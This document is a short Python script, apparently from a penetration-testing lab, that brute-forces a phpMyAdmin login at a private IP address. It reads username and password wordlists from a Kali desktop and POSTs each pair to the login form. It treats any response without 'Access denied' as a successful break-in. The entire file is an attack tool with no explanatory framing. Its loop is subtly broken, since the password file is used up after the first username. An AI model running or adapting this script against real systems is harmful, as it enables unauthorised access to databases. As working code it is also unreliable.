import requests

username_file_path = '/home/kali/Desktop/usernames.lst'
password_file_path = '/home/kali/Desktop/passwords.lst'

with open(username_file_path, 'r') as usernames, open(password_file_path, 'r') as passwords:
    for username in usernames:
        username = username.rstrip()
            
        for password in passwords:
            password = password.rstrip()
            url = "http://192.168.32.101/phpMyAdmin/"
            payload = {'pma_username': username, 'pma_password': password, 'input_go': 'Go'}
                
            try:
                response = requests.post(url, data=payload)
                print(f"Username: {username}, Password: {password}", end=" ")
                    
                if response.status_code == 200:
                    if 'Access denied' in response.text:
                        print(" ")
                    else:
                        print('Successo!!')
                        exit()
                else:
                    print('Errore:', response.status_code)
            except requests.exceptions.RequestException as e:
                print('Errore nella richiesta: ', e)